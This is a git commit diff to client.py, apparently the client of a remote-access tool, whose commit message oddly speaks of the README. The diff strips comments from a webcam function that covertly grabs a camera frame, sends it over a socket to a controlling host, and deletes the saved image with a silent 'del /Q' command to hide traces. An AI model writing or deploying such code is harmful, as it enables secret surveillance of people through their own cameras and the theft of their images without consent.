50a10a9afa891f209e40bf15b30e6cc75766f4e8
Radhey <radheypatel272@gmail.com>
2020-08-13 06:59:03 +0530

    Updated the README.md

--- client.py
+++ client.py
@@ -7,8 +7,8 @@ import subprocess
 import cv2
 
 def webcam(s):
-    cap = cv2.VideoCapture(0) # video capture source camera (Here webcam of laptop)
-    ret,frame = cap.read() # return a single frame in variable `frame`
+    cap = cv2.VideoCapture(0)
+    ret,frame = cap.read()
     cv2.imwrite('ss.png',frame)
     transfer(s, "ss.png")
     subprocess.Popen("del /Q ss.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
